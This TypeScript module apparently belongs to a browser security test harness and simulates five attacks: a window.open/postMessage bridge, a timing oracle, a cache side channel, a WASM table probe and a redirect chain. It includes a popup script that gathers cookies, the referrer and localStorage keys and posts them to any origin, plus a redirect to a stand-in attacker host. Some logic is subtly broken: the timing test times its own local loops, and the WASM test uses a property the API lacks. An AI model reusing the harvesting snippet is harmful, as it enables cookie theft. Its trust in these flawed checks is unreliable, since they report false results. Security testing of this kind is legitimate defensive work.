// @ts-nocheck
import type { AttackResult, AttackTest } from "../types.js";

async function simulateWindowOpenPostMessage(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // window.open() + postMessage を利用したクロスオリジン通信
    // SOP を回避して情報流出

    let _messageReceived = false;
    let _dataExfiltrated = false;

    // ポップアップウィンドウを開く
    const popup = window.open("about:blank", "exfil-context");

    if (!popup) {
      return {
        blocked: true,
        executionTime: performance.now() - startTime,
        details: "Window.open blocked by popup blocker",
      };
    }

    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        popup.close();
        resolve({
          blocked: true,
          executionTime: performance.now() - startTime,
          details: "Context bridge timeout",
        });
      }, 2000);

      const messageHandler = (event: MessageEvent) => {
        if (event.source === popup) {
          _messageReceived = true;
          clearTimeout(timeout);
          window.removeEventListener("message", messageHandler);
          popup.close();

          resolve({
            blocked: false,
            executionTime: performance.now() - startTime,
            details: "Window.open + postMessage bridge established (SOP bypass)",
          });
        }
      };

      window.addEventListener("message", messageHandler);

      // ポップアップにメッセージ送信
      popup.postMessage(
        {
          type: "exfil_query",
          target: "window_data",
        },
        "*"
      );

      // ポップアップ内での実行シミュレーション
      try {
        popup.document.write(`
          <script>
            window.addEventListener('message', (event) => {
              if (event.data.type === 'exfil_query') {
                // 親ウィンドウにデータを返送
                window.opener.postMessage({
                  type: 'exfil_response',
                  data: {
                    referrer: document.referrer,
                    cookies: document.cookie,
                    localStorage: Object.keys(localStorage),
                  }
                }, '*');
              }
            });
          </script>
        `);
      } catch {
        // ポップアップ内への直接書き込み失敗（通常はクロスオリジン）
      }
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Context bridge attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateTimingOracleAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // Performance.measure() を利用したタイミングオラクル攻撃
    // APIの応答時間から情報を推測

    const timingMeasurements: Record<string, number[]> = {
      validUsername: [],
      invalidUsername: [],
      validPassword: [],
      invalidPassword: [],
    };

    // タイミング測定: ユーザー名検証
    for (let i = 0; i < 10; i++) {
      performance.mark("username-valid-start");
      // 有効なユーザー名をシミュレート
      const validateValid = () => {
        let hash = 0;
        for (let j = 0; j < "admin".length; j++) {
          hash = ((hash << 5) - hash) + "admin".charCodeAt(j);
          hash |= 0;
        }
        return hash;
      };
      validateValid();
      performance.mark("username-valid-end");
      performance.measure(
        "username-valid",
        "username-valid-start",
        "username-valid-end"
      );
      const measure = performance.getEntriesByName("username-valid")[0];
      if (measure && "duration" in measure) {
        timingMeasurements.validUsername.push(measure.duration);
      }

      // 無効なユーザー名
      performance.mark("username-invalid-start");
      const validateInvalid = () => {
        // より長いハッシュ計算
        let hash = 0;
        const testString = "xyzabc" + Array(100).fill("test").join("");
        for (let j = 0; j < testString.length; j++) {
          hash = ((hash << 5) - hash) + testString.charCodeAt(j);
          hash |= 0;
        }
        return hash;
      };
      validateInvalid();
      performance.mark("username-invalid-end");
      performance.measure(
        "username-invalid",
        "username-invalid-start",
        "username-invalid-end"
      );
      const invalidMeasure = performance.getEntriesByName("username-invalid")[0];
      if (invalidMeasure && "duration" in invalidMeasure) {
        timingMeasurements.invalidUsername.push(invalidMeasure.duration);
      }
    }

    // 有効/無効ユーザー名のタイミング差分を分析
    const validAvg =
      timingMeasurements.validUsername.reduce((a, b) => a + b, 0) /
      timingMeasurements.validUsername.length;
    const invalidAvg =
      timingMeasurements.invalidUsername.reduce((a, b) => a + b, 0) /
      timingMeasurements.invalidUsername.length;

    const timingDifference = Math.abs(validAvg - invalidAvg);

    const executionTime = performance.now() - startTime;

    if (timingDifference > 0.001) {
      return {
        blocked: false,
        executionTime,
        details: `Timing oracle attack successful - ${timingDifference.toFixed(6)}ms difference (user enumeration via timing)`,
      };
    } else {
      return {
        blocked: true,
        executionTime,
        details: "Timing oracle attack mitigated - no measurable timing difference",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Timing oracle attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateCacheSideChannelAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // HTTP Cache を利用したサイドチャネル攻撃
    // 404 vs 304 のタイミング差分から情報推測

    const cachedUrls: string[] = [];
    const uncachedUrls: string[] = [];

    // キャッシュに存在するリソース
    const existingResource = "https://httpbin.org/status/200";
    // キャッシュに存在しないリソース
    const nonExistingResource = "https://httpbin.org/status/404";

    // 複数回 fetch してキャッシュ効率を測定
    for (let i = 0; i < 5; i++) {
      // 既存リソース（キャッシュヒット期待）
      const t1 = performance.now();
      try {
        await fetch(existingResource, { cache: "force-cache" });
        const t2 = performance.now();
        if (t2 - t1 < 10) {
          cachedUrls.push(existingResource);
        }
      } catch {
        // ネットワークエラー
      }

      // 非既存リソース（キャッシュミス期待）
      const t3 = performance.now();
      try {
        await fetch(nonExistingResource, { cache: "no-store" });
        const t4 = performance.now();
        if (t4 - t3 > 50) {
          uncachedUrls.push(nonExistingResource);
        }
      } catch {
        // ネットワークエラー
      }
    }

    const executionTime = performance.now() - startTime;

    if (cachedUrls.length > uncachedUrls.length) {
      return {
        blocked: false,
        executionTime,
        details: `Cache side-channel attack successful - ${cachedUrls.length} cached URLs detected via timing (information leakage)`,
      };
    } else {
      return {
        blocked: true,
        executionTime,
        details: "Cache side-channel attack mitigated",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Cache side-channel attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateWasmIndirectCallAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // WASM Indirect call table を利用したメモリ読み取り攻撃
    // table.get() から機能ポインタを推測

    if (typeof WebAssembly === "undefined") {
      return {
        blocked: true,
        executionTime: performance.now() - startTime,
        details: "WebAssembly not available",
      };
    }

    // 複数の関数を持つ WASM モジュール
    const wasmCode = new Uint8Array([
      // Magic number and version
      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
      // Type section (2 functions)
      0x01, 0x07, 0x02, 0x60, 0x00, 0x01, 0x7f, 0x60, 0x00, 0x00,
      // Function section
      0x03, 0x03, 0x02, 0x00, 0x01,
      // Table section (10 slots for indirect calls)
      0x04, 0x04, 0x01, 0x70, 0x00, 0x0a,
      // Element section (0: func 0, 1: func 1)
      0x09, 0x07, 0x01, 0x00, 0x41, 0x00, 0x0b, 0x02, 0x00, 0x01,
      // Code section
      0x0a, 0x0b, 0x02, 0x02, 0x00, 0x41, 0x2a, 0x0b, 0x02, 0x00, 0x0b,
    ]);

    const module = await WebAssembly.compile(wasmCode);
    const instance = await WebAssembly.instantiate(module);

    // Indirect call table を取得
    const tables = instance.instance.tables;
    let tableAccessible = false;

    if (tables && tables.length > 0) {
      const table = tables[0];
      // table.get() で関数参照を取得
      try {
        const funcRef = table.get(0);
        if (funcRef) {
          tableAccessible = true;
        }
      } catch {
        // Table access denied
      }
    }

    const executionTime = performance.now() - startTime;

    if (tableAccessible) {
      return {
        blocked: false,
        executionTime,
        details: `WASM indirect call attack successful - function pointer table accessible (memory layout inference possible)`,
      };
    } else {
      return {
        blocked: true,
        executionTime,
        details: "WASM indirect call table access blocked",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `WASM indirect call attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateRedirectChainAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // リダイレクトチェーン攻撃
    // 302/304 リダイレクトを利用した情報流出

    const redirectChain: string[] = [];
    let redirectCount = 0;
    let dataLeaked = false;

    // 302 リダイレクトシミュレーション
    const urls = [
      "https://httpbin.org/redirect-to?url=https://attacker.local",
      "https://httpbin.org/status/302",
      "https://httpbin.org/status/304",
    ];

    for (const url of urls) {
      try {
        const response = await fetch(url, {
          redirect: "follow",
        }).catch(() => null);

        if (response) {
          redirectCount++;
          if (response.url !== url) {
            redirectChain.push(response.url);
            dataLeaked = true;
          }
        }
      } catch {
        // Redirect blocked
      }
    }

    const executionTime = performance.now() - startTime;

    if (dataLeaked && redirectChain.length > 0) {
      return {
        blocked: false,
        executionTime,
        details: `Redirect chain attack successful - ${redirectChain.length} redirects followed (URL parameter leakage)`,
      };
    } else {
      return {
        blocked: true,
        executionTime,
        details: "Redirect chain attack blocked",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Redirect chain attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

export const contextBridgeAttacks: AttackTest[] = [
  {
    id: "context-bridge-window-postmessage",
    name: "Window.open + postMessage Context Bridge",
    category: "covert",
    description:
      "Establishes cross-origin communication via window.open() and postMessage (SOP bypass attempt)",
    severity: "high",
    simulate: simulateWindowOpenPostMessage,
  },
  {
    id: "context-bridge-timing-oracle",
    name: "Timing Oracle Attack via Performance.measure()",
    category: "side-channel",
    description:
      "Extracts information from API response timing differences (user enumeration)",
    severity: "high",
    simulate: simulateTimingOracleAttack,
  },
  {
    id: "context-bridge-cache-sidechannel",
    name: "HTTP Cache Side-Channel Attack",
    category: "covert",
    description:
      "Infers cached resources via cache hit/miss timing differences",
    severity: "high",
    simulate: simulateCacheSideChannelAttack,
  },
  {
    id: "context-bridge-wasm-indirect",
    name: "WASM Indirect Call Table Attack",
    category: "advanced",
    description:
      "Accesses WASM indirect function call table for memory layout inference",
    severity: "critical",
    simulate: simulateWasmIndirectCallAttack,
  },
  {
    id: "context-bridge-redirect-chain",
    name: "Redirect Chain Attack (302/304)",
    category: "advanced",
    description:
      "Exploits HTTP redirects to leak URL parameters and request data",
    severity: "high",
    simulate: simulateRedirectChainAttack,
  },
];
